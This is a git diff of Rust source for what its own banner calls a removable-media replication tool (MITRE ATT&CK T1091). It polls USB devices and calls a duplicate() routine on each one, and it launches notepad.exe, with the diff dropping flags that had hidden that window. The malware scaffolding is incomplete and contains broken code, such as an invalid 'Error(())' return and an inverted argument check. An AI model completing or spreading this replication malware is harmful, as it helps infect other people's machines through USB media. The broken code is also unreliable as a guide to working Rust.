@@ -1,22 +1,24 @@
-use std::process::{Command, Stdio};
+use std::process::Command;
+use std::io::{Error, ErrorKind};
 use std::os::windows::process::CommandExt;
-use winapi::um::winbase::CREATE_NO_WINDOW;
-use libusb::{self, DeviceList};
+use rusb::UsbContext;
+use rusb::{Context, Device, DeviceHandle, Result as UsbResult};
 use std::fs::File;
 use std::env;
-
+use std::thread::sleep;
+use std::time::Duration;
 
 fn main() {
     let args: Vec<String> = env::args().collect();
     if args.len() != 1{
-        eprintln("[-] err: too many args");
-        eprintln("[*] example : {} C:\\Windows\\System32\\filename.exe")
+        eprintln!("[-] err: too many args");
+        eprintln!("[*] example : {} C:\\Windows\\System32\\filename.exe")
     }
 
     eprintln!("[*] removable media replication att&ck id: T1091");
     eprintln!("[*] written by peroxidee / iluvwerewolves ");
     
-    processHandler();
+    process_handler();
         
 }
 
@@ -30,13 +32,13 @@ fn duplicate(device: &Device) -> Result<(), Error>{
     Ok(())
 }
 
-fn getinfo(device: &Device) -> Result<(), Error>{
-    if let Ok(handle) = device.open(){
-        println!(device);    
-    }
+// fn getinfo(device: &Device) -> Result<(), Error>{
+//     if let Ok(handle) = device.open(){
+//         println!("{}", device);    
+//     }
 
-    Ok(())
-}
+//     Ok(())
+// }
 fn monitor() -> Result<(), Error>{
 
     let lusb_context = Context::new()?;
@@ -48,34 +50,29 @@ fn monitor() -> Result<(), Error>{
         let connected_usb_devices = lusb_context.devices()?;
         if connected_usb_devices.len() != prev.len(){  
             for device in connected_usb_devices.iter(){
-                match getinfo(&device){
-                    Ok(_) => duplicate(&device),
-                    Err(e) => eprintln!("[-] err: {:?}", e)
-                }  
+                duplicate(&device)?; 
             }
+            break;
         }
-        sleep(30);
+        let thirty_seconds = Duration::new(30, 0);
+        sleep(thirty_seconds);
     }
 
     Ok(())
     
 }
 
-fn processHandler() {
-    let mut ntpd = Command::new("C:\\Windows\\System32\\notepad.exe");
+fn process_handler() {
+    let  ntpd = Command::new("C:\\Windows\\System32\\notepad.exe");
     
     match start(&ntpd){
-        Ok()=> (),
-        Err(e) => eprintln("[-] err: {:?}", e),
+        Ok(_) => (),
+        Err(e) => eprintln!("[-] err: {:?}", e),
     }
 }
 
 fn start(cmd: &Command) -> Result<(), std::io::Error>{
-    cmd.creation_flags(CREATE_NO_WINDOW)
-        .stdout(Stdio::null())
-        .stderr(Stdio::null())
-        .stdin(Stdio::null());
-    
+   
 
 
     if let Ok(mut child) = cmd.spawn(){
@@ -89,8 +86,8 @@ fn start(cmd: &Command) -> Result<(), std::io::Error>{
     }
     else{
         eprintln!("[-] err: process not started!");
-    
-    Error(())
+        Error(())
     }
+    Ok(())
     
 }
